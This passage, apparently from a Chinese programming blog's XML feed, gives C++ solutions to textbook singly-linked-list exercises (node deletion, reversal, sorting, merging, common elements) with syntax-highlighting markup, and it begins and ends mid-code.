    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            numSet<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>numSet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构编程题 链表</title>
    <url>/2023/07/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="链表定义"><a href="#链表定义" class="headerlink" title="链表定义"></a>链表定义</h1><p>以下为本文解题代码的链表定义。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">ListNode</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> val<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> next<span class="token punctuation">;</span>
    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> ListNode<span class="token operator">*</span> next <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="递归删除结点"><a href="#递归删除结点" class="headerlink" title="递归删除结点"></a>递归删除结点</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计一个递归算法，删除不带头结点的单链表 L 中的所有值为 x 的结点，并返回新的链表头节点。</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ListNode<span class="token operator">*</span> <span class="token function">deleteNodeRecur</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> head<span class="token punctuation">;</span>
    head<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token function">deleteNodeRecur</span><span class="token punctuation">(</span>head<span class="token operator">-></span>next<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>val <span class="token operator">==</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> nextNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token keyword">delete</span> head<span class="token punctuation">;</span>
        <span class="token keyword">return</span> nextNode<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> head<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="删除结点"><a href="#删除结点" class="headerlink" title="删除结点"></a>删除结点</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>在带头结点的单链表 L 中，删除所有值为 x 的结点，并释放其空间，假设值为 x 的结点不唯一，试编写算法以实现上述功能。</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">deleteNode</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next<span class="token operator">-></span>val <span class="token operator">==</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            ListNode<span class="token operator">*</span> p <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
            head<span class="token operator">-></span>next <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span>
            <span class="token keyword">delete</span> p<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="反向输出结点值"><a href="#反向输出结点值" class="headerlink" title="反向输出结点值"></a>反向输出结点值</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>设 L 为不带头结点的单链表，编写算法实现从尾到头反向输出每个结点的值。</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">reversePrint</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token function">reversePrint</span><span class="token punctuation">(</span>head<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> head<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="删除最小值结点"><a href="#删除最小值结点" class="headerlink" title="删除最小值结点"></a>删除最小值结点</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>试编写在带头结点的单链表 L 中删除一个最小值结点的高效算法（假设最小值结点是唯一的）。</p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">deleteMinNode</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> preMinNode <span class="token operator">=</span> head<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> minNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next<span class="token operator">-></span>val <span class="token operator">&lt;</span> minNode<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            preMinNode <span class="token operator">=</span> head<span class="token punctuation">;</span>
            minNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    preMinNode<span class="token operator">-></span>next <span class="token operator">=</span> preMinNode<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token keyword">delete</span> minNode<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="逆置链表"><a href="#逆置链表" class="headerlink" title="逆置链表"></a>逆置链表</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p>试编写算法将带头结点的单链表就地逆置。所谓“就地”是指辅助空间复杂度为 O(1).</p>
<h2 id="解题代码-4"><a href="#解题代码-4" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">reverseList</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> preNode <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> curNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> tempNode <span class="token operator">=</span> curNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
        curNode<span class="token operator">-></span>next <span class="token operator">=</span> preNode<span class="token punctuation">;</span>
        preNode <span class="token operator">=</span> curNode<span class="token punctuation">;</span>
        curNode <span class="token operator">=</span> tempNode<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    head<span class="token operator">-></span>next <span class="token operator">=</span> preNode<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="链表排序"><a href="#链表排序" class="headerlink" title="链表排序"></a>链表排序</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p>有一个带头结点的单链表 L，设计一个算法使其元素单调递增有序。</p>
<h2 id="解题代码-5"><a href="#解题代码-5" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">selectSortList</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> beginNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>beginNode <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> curNode <span class="token operator">=</span> beginNode<span class="token punctuation">;</span>
        ListNode<span class="token operator">*</span> minNode <span class="token operator">=</span> curNode<span class="token punctuation">;</span>
        <span class="token keyword">int</span> minVal <span class="token operator">=</span> curNode<span class="token operator">-></span>val<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>minVal <span class="token operator">></span> curNode<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                minVal <span class="token operator">=</span> curNode<span class="token operator">-></span>val<span class="token punctuation">;</span>
                minNode <span class="token operator">=</span> curNode<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            curNode <span class="token operator">=</span> curNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">swap</span><span class="token punctuation">(</span>beginNode<span class="token operator">-></span>val<span class="token punctuation">,</span> minNode<span class="token operator">-></span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
        beginNode <span class="token operator">=</span> beginNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">insertSort</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> lastSorted <span class="token operator">=</span> head<span class="token punctuation">;</span> <span class="token comment">// 最后一个已排序结点</span>
    ListNode<span class="token operator">*</span> curNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// 当前待排序结点</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>lastSorted<span class="token operator">-></span>val <span class="token operator">&lt;=</span> curNode<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            lastSorted <span class="token operator">=</span> lastSorted<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            ListNode<span class="token operator">*</span> preNode <span class="token operator">=</span> head<span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>preNode<span class="token operator">-></span>next<span class="token operator">-></span>val <span class="token operator">&lt;=</span> curNode<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                preNode <span class="token operator">=</span> preNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            lastSorted<span class="token operator">-></span>next <span class="token operator">=</span> curNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            curNode<span class="token operator">-></span>next <span class="token operator">=</span> preNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            preNode<span class="token operator">-></span>next <span class="token operator">=</span> curNode<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        curNode <span class="token operator">=</span> lastSorted<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="寻找两链表的公共结点"><a href="#寻找两链表的公共结点" class="headerlink" title="寻找两链表的公共结点"></a>寻找两链表的公共结点</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定两个单链表，编写算法找出两个链表的公共结点。</p>
<h2 id="解题代码-6"><a href="#解题代码-6" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ListNode<span class="token operator">*</span> <span class="token function">publicNode</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> head2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> curNode1 <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> curNode2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode1 <span class="token operator">!=</span> curNode2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>curNode1 <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            curNode1 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            curNode1 <span class="token operator">=</span> curNode1<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>curNode2 <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            curNode2 <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            curNode2 <span class="token operator">=</span> curNode2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> curNode1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="分解单链表"><a href="#分解单链表" class="headerlink" title="分解单链表"></a>分解单链表</h1><h2 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h2><p>将一个带头结点的单链表 A 分解为两个带头结点的单链表 A 和 B，使得 A 表中含有原表中序号为奇数的元素，而 B 表中含有原表中序号为偶数的元素，且保持其相对顺序不变。</p>
<h2 id="解题代码-7"><a href="#解题代码-7" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ListNode<span class="token operator">*</span> <span class="token function">decomposeList</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> bHead <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> bCurNode <span class="token operator">=</span> bHead<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        bCurNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>head<span class="token operator">-></span>next<span class="token operator">-></span>val<span class="token punctuation">,</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bCurNode <span class="token operator">=</span> bCurNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
        ListNode<span class="token operator">*</span> tempNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
        head<span class="token operator">-></span>next <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token keyword">delete</span> tempNode<span class="token punctuation">;</span>
        head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> bHead<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="链表元素去重"><a href="#链表元素去重" class="headerlink" title="链表元素去重"></a>链表元素去重</h1><h2 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h2><p>在一个递增有序的线性表中，有数值相同的元素存在。若存储方式为不带头结点的单链表，设计算法去掉数值相同的元素，使表中不再有重复的元素，例如（7, 10, 10, 21, 30, 42, 42, 42, 51, 70）将变为（7, 10, 21, 30, 42, 51, 70）。</p>
<h2 id="解题代码-8"><a href="#解题代码-8" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">deduplicateList</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>val <span class="token operator">==</span> head<span class="token operator">-></span>next<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            ListNode<span class="token operator">*</span> tempNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
            head<span class="token operator">-></span>next <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span>
            <span class="token keyword">delete</span> tempNode<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="合并有序单链表"><a href="#合并有序单链表" class="headerlink" title="合并有序单链表"></a>合并有序单链表</h1><h2 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h2><p>假设有两个按元素递增次序排列的线性表，均已带头结点的单链表形式存储。请编写算法将这两个单链表归并为一个按元素递减次序排列的单链表，并要求利用原来两个单链表的结点存放归并后的单链表。</p>
<h2 id="解题代码-9"><a href="#解题代码-9" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ListNode<span class="token operator">*</span> <span class="token function">mergeSortedList</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> head2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    head1 <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
    head2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> head3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> head2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head1<span class="token operator">-></span>val <span class="token operator">&lt;=</span> head2<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 头插法使得插入后逆序</span>
            ListNode<span class="token operator">*</span> newNode <span class="token operator">=</span> head1<span class="token punctuation">;</span>
            head1 <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
            newNode<span class="token operator">-></span>next <span class="token operator">=</span> head3<span class="token operator">-></span>next<span class="token punctuation">;</span>
            head3<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            ListNode<span class="token operator">*</span> newNode <span class="token operator">=</span> head2<span class="token punctuation">;</span>
            head2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
            newNode<span class="token operator">-></span>next <span class="token operator">=</span> head3<span class="token operator">-></span>next<span class="token punctuation">;</span>
            head3<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> newNode <span class="token operator">=</span> head1<span class="token punctuation">;</span>
        head1 <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
        newNode<span class="token operator">-></span>next <span class="token operator">=</span> head3<span class="token operator">-></span>next<span class="token punctuation">;</span>
        head3<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> newNode <span class="token operator">=</span> head2<span class="token punctuation">;</span>
        head2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        newNode<span class="token operator">-></span>next <span class="token operator">=</span> head3<span class="token operator">-></span>next<span class="token punctuation">;</span>
        head3<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> head3<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="根据公共元素建立链表"><a href="#根据公共元素建立链表" class="headerlink" title="根据公共元素建立链表"></a>根据公共元素建立链表</h1><h2 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h2><p>设 A 和 B 是两个带头结点的单链表，其中元素递增有序且无重复元素。设计一个算法从 A 和 B 中的公共元素产生单链表 C，要求不破坏 A、B 的结点。</p>
<h2 id="解题代码-10"><a href="#解题代码-10" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ListNode<span class="token operator">*</span> <span class="token function">generateList</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> head2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> head3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> curNode <span class="token operator">=</span> head3<span class="token punctuation">;</span>
    head1 <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
    head2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> head2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head1<span class="token operator">-></span>val <span class="token operator">==</span> head2<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            curNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>head1<span class="token operator">-></span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
